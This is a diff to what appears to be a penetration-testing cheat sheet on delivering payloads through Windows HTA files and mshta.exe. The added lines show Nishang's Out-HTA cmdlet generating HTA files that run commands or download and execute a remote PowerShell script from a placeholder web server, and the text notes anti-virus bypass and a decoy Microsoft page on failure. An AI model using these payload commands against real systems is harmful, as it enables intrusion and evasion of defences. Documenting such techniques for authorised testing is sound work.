@@ -374,7 +374,7 @@ Windows HTML Application script can contain JavaScript or VBScript that will be
 interpreted by the operating system.
 
 The HTA script can be interpreted through `Internet Explorer` or the Windows
-utility `mshta.exe`. As the file is not written on disk but directly
+engine `mshta.exe`. As the file is not written on disk but directly
 interpreted from the remote URL, this technique can be used to bypass
 some anti-virus solutions.
 
@@ -393,6 +393,21 @@ The following HTA script can be used to load in memory and execute the Nishang P
   Next
   window.close()
 </script>
+```
+
+The Nishang's `Out-HTA` PowerShell cmdlet can be used as well to generate a
+HTA file with in-lined commands or that will download and execute a remote
+PowerShell script. It has the notable advantage of providing a failover
+mechanism: a live page related to Windows Defender from the Microsoft website
+is loaded if the HTA execution fails .
+
+```
+# Import-Module .\Out-HTA.ps1
+# Get-Help -full Out-HTA
+
+Out-HTA -Payload '<COMMAND>'
+Out-HTA -PayloadURL '<http://<WEBSERVER_IP>:<WEBSERVER_PORT>/<PowerShell.ps1>'
+Out-HTA -PayloadScript '<POWERSHELL_FILEPATH>'
 ```
 
 #### Binary
